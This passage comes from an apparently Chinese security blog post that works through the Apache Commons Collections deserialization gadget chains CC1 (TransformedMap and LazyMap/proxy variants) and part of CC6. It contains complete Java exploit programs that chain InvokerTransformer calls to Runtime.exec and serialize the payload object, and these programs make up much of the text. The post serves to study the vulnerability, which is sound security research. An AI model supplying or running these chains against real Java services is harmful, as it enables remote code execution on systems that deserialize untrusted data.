class_">HashMap</span>&lt;&gt;();<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111540254.png" alt="image">​</p><h3 id="AbstractInputCheckedMapDecorator​​​"><a href="#AbstractInputCheckedMapDecorator​​​" class="headerlink" title="AbstractInputCheckedMapDecorator​​​"></a><code>AbstractInputCheckedMapDecorator</code>​​​</h3><p>发现已经赋值了，那我们就看看如何调用这个<code>protected</code>​属性的<code>checkSetValue</code>​</p><p>于是作者找到了 <code>commons-collections-3.2.1-sources.jar!\org\apache\commons\collections\map\AbstractInputCheckedMapDecorator.java#setValue </code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111540410.png" alt="image">​</p><p>这里要搞清楚这个类的逻辑，</p><p><code>AbstractInputCheckedMapDecorator</code>​ 这个类其实是<code>TransformedMap</code>​的父类</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111540540.png" alt="image">​</p><p>并且这个<code>setValue</code>​方法是在一个静态类<code>MapEntry</code>​里头的</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111540690.png" alt="image">​</p><p>‍</p><p>搞清楚逻辑后，其实这个<code>MapEntry</code>​ 就是遍历Map的键值对的一个静态类，在以下代码中就会触发他的方法(其实就是重写了<code>Map#setvalue</code>​方法)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (Map.Entry entry:transformedMap.entrySet())&#123;<br>    entry.setValue(<span class="hljs-string">&quot;aaa&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>那其实就可以得到，只要去对这个键值对进行<code>setValue</code>​方法即可触发</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111540810.png" alt="image">​</p><p>所以现在只要把我们的Runtime对象传入到value值即可触发任意方法调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br><span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>map.put(<span class="hljs-string">&quot;q&quot;</span>,<span class="hljs-string">&quot;q&quot;</span>);<br>Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="hljs-literal">null</span>,invokerTransformer);<br><span class="hljs-keyword">for</span> (Map.Entry entry:transformedMap.entrySet())&#123;<br>    entry.setValue(r);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111540958.png" alt="image">​</p><p>那么我们后半条链子就连起来了，接下来就是去找哪个地方是存在<code>Entry</code>​的遍历的，并且可以把对象传入的点</p><h3 id="AnnotationInvocationHandler​​​"><a href="#AnnotationInvocationHandler​​​" class="headerlink" title="AnnotationInvocationHandler​​​"></a><code>AnnotationInvocationHandler</code>​​​</h3><p>作者就找到了<code>jdk1.8.0_65\src\sun\reflect\annotation\AnnotationInvocationHandler.java</code>​ 中的 <code>readObject</code>​ 方法是调用了<code>setValue</code>​ ，那么其实已经找到<code>readObject</code>​就非常好可以进行串联了</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111540111.png" alt="image">​</p><p>那我们来看一下他的构造方法</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111540302.png" alt="image">​</p><p>也很简单，就是传一个注解和一个Map类，又因为他不是public类，所以必须得用反射去实例化他，那么就其实挺简单，就反射区实例化他即可，然后把我们设计好的<code>Entry</code>​传给他即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span>  Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br><span class="hljs-type">Constructor</span> <span class="hljs-variable">cl</span>  <span class="hljs-operator">=</span>  c.getDeclaredConstructor(Class.class,Map.class);<br>cl.setAccessible(<span class="hljs-literal">true</span>);<br>cl.newInstance(Override.class,transformedMap);<br></code></pre></td></tr></table></figure><p>但是这里仍然存在几个问题</p><ul><li><code>Runtime</code>​对象是不可以序列化的，需要用反射进行序列化</li><li><code>setValue</code>​方法的参数貌似不可控</li><li>有两个if判断需要进去</li></ul><p>‍</p><p>先解决第一个问题 如何让<code>Runtime</code>​对象可以序列化</p><p>‍</p><p>因为Class类是可以反序列化的，所以只要让<code>Runtime</code>​为Class类并且调用其方法即可</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111540425.png" alt="image">​</p><p>他是存在<code>getRuntime</code>​的静态方法的，所以可以直接调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span>  Runtime.class;<br><span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> r.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>);<br><span class="hljs-type">Runtime</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Runtime) m.invoke(<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>); <span class="hljs-comment">// 注意这里是getRuntime()的无参构造</span><br><span class="hljs-type">Method</span> <span class="hljs-variable">m1</span> <span class="hljs-operator">=</span> r.getMethod(<span class="hljs-string">&quot;exec&quot;</span>,String.class);<br>m1.invoke(o,<span class="hljs-string">&quot;calc&quot;</span>);<br></code></pre></td></tr></table></figure><p>那第一个问题就解决了，那么接下来就是通过<code>InvokerTransformer</code>​的反射来吧这个反射重写一遍</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span>  Runtime.class;<br><span class="hljs-type">Method</span> <span class="hljs-variable">m</span>  <span class="hljs-operator">=</span> (Method) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;).transform(r);<br><span class="hljs-type">Runtime</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Runtime) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;).transform(m);<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;).transform(o);<br></code></pre></td></tr></table></figure><p>这样就写好了，但是可以发现这里是前一个接收的对象作为后一个transform方法的输入</p><p>‍</p><p>所以作者又找到了一个类 <code>ChainedTransformer</code>​</p><p>构造方法就是传一个<code>Transformer</code>​类的数组</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111540550.png" alt="image">​</p><p>然后这个类的<code>transform</code>​方法就会进行一个链式调用</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111540668.png" alt="image">​</p><p>‍</p><p>那么我可以定义一个<code>Transformer</code>​的数组然后将<code>InvokerTransformer</code>​的发射链式调用写进去然后去触发其<code>transform</code>​方法即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span>  Runtime.class;<br>Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)&#125; ;<br><br><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>chainedTransformer.transform(r);<br></code></pre></td></tr></table></figure><p>那么现在就剩下两个问题了</p><p>我们跟进去看如何去保证两个If语句都进入呢</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111540806.png" alt="image">​</p><p>首先第一个if是比较容易过的，因为他要去找<code>AnnotationInvocationHandler</code>​传进来的注解的成员变量，要存在并且map的key可以找到他的成员变量即可，所以做出以下修改</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111540927.png" alt="image">​</p><p>第二个if就直接过就行了，所以最后的问题就是这一句话</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">memberValue.setValue(<span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>)<br></code></pre></td></tr></table></figure><p>那是不是这个传入的东西不可控了呢?</p><p>‍</p><p>这里作者再次找到了一个实现类<code>ConstantTransformer</code>​</p><p>他的<code>transform</code>​方法就是一句话 传入什么都返回常量，那我无所谓value的值，只需要在</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111540071.png" alt="image">​</p><p>那如果返回的常量是<code>Runtime.class</code>​就可以进行传入了</p><p>‍</p><p>整条链子就结束了 exp如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span>  <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>  <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)&#125; ;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="hljs-literal">null</span>,chainedTransformer);<br>  <br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span>  Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">cls</span>  <span class="hljs-operator">=</span>  c.getDeclaredConstructor(Class.class,Map.class);<br>        cls.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> cls.newInstance(Target.class,transformedMap);<br>  <br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>‍</p><p>我们来回顾一下这条链子，从正向调过去</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">反序列化#readObject-&gt;<br>AnnotationInvocationHandler#readObject(存在setValue)<br>MapEntry#setValue(存在checkSetValue)<br>transformedMap#checkSetValue(存在transform)<br>InvokerTransformer.transform(就可以调用任意方法执行任意操作)<br></code></pre></td></tr></table></figure><pre><code class="hljs">                                                    ![image](https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111540200.png)​</code></pre><p>‍</p><p>‍</p><h2 id="LazyMap​​"><a href="#LazyMap​​" class="headerlink" title="LazyMap​​"></a><code>LazyMap</code>​​</h2><p>‍</p><p>在调用<code>transform</code>​ 方法中，<code>LazyMap#get()</code>​也调用了</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111540318.png" alt="image">​</p><p>但这里存在个条件</p><ol><li>key要为空</li></ol><p>然后就会调用<code>factory</code>​的<code>transform</code>​，那<code>factory</code>​咋来的呢？</p><p>可以看看他的静态方法和构造器</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111540445.png" alt="image">​</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111540619.png" alt="image">​</p><p>‍</p><p>可以明显看出 就是构造的时候传进去<code>Transformer</code>​类即可</p><p>所以可以构造如下代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);<br></code></pre></td></tr></table></figure><p>那么往上找一下谁调用了<code>get()</code>​方法并且可以传值为Object</p><p>‍</p><p>于是作者找到了<code>AnnotationInvocationHandler#invoke</code>​方法调用了<code>get</code>​方法</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111540743.png" alt="image">​</p><p>又因为这个是<code>invoke</code>​方法，所以可以想到如果传入的是一个动态代理，并且调用的这个处理器类就可以默认去执行他的<code>invoke</code>​方法，所以其实也很清晰，就是通过传入一个代理类然后去调用一个方法即可触发这个代理调用处理器的<code>invoke</code>​方法，那么这里的<code>invoke</code>​是有几个条件的</p><ol><li>不能调用<code>equals</code>​</li><li>无参方法</li></ol><p>结果<code>readObject()</code>​中真的就存在一个不受限制的无参方法<code>entrySet</code>​</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111540944.png" alt="image">​</p><p>所以这里就可以写exp了，将我们代理类以Map类传入，就可以走通了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)&#125; ;<br><br><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>  <br>HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);<br>  <br><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span>  Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br><span class="hljs-type">Constructor</span> <span class="hljs-variable">cls</span>  <span class="hljs-operator">=</span>  c.getDeclaredConstructor(Class.class,Map.class);<br>cls.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> (InvocationHandler) cls.newInstance(Override.class,lazyMap);<br><br><span class="hljs-type">Map</span> <span class="hljs-variable">maproxy</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;,h);<br><br><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> cls.newInstance(Override.class,maproxy);<br>  <br>serialize(o);<br>unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111540084.png" alt="image">​</p><p>这里来解释一下为什么代理Map和实例化两个 因为我们可以看到两个<code>membervalue</code>​</p><p>第一个实例化对象是把Map给到readObject的<code>Map.Entry</code>​来调用<code>entrySet</code>​，第二个实例化对象是通过调用<code>entrySet</code>​来触发动态代理的<code>invoke</code>​方法</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111540223.png" alt="image">​</p><p>‍</p><p>‍</p><h1 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h1><p>他是不受JDK版本的限制的</p><p>‍</p><p>CC6其实就是CC1的<code>LazyMap</code>​后半段+前半段是<code>HashMap</code>​</p><p>‍</p><p>链子也很简单 作者从HashMap中发现了如下东西</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap#readObject<br>TiedMapEntry#hashcode<br>LazyMap#get<br>InvokerTransformer.transform(就可以调用任意方法执行任意操作)<br></code></pre></td></tr></table></figure><p>先看<code>TiedMapEntry</code>​的构造方法比较简单直接传map跟key即可</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111540416.png" alt="image">​</p><p>‍</p><p>所以简单就可以构造出来，这里先放序列化就可以调用calc的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>           <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>           <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>           <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>           <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)&#125; ;<br><br>   <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>   HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>   Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);<br><br><br>   <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;aa&quot;</span>);<br>   HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>   map2.put(tiedMapEntry, <span class="hljs-string">&quot;bbb&quot;</span>);<br><br>   serialize(map2);<br></code></pre></td></tr></table></figure><p>为啥呢，从URLDNS链也可以知道 ，<code>HashMap#put()</code>​方法也是可以触发<code>hashcode</code>​的，所以我们还需要用反射的方式去修改点属性让他反序列化出来也没问题</p><p>所以可以先让他put进去的时候是空的，然后put完去序列化的时候通过反射再给他赋值</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111540551.png" 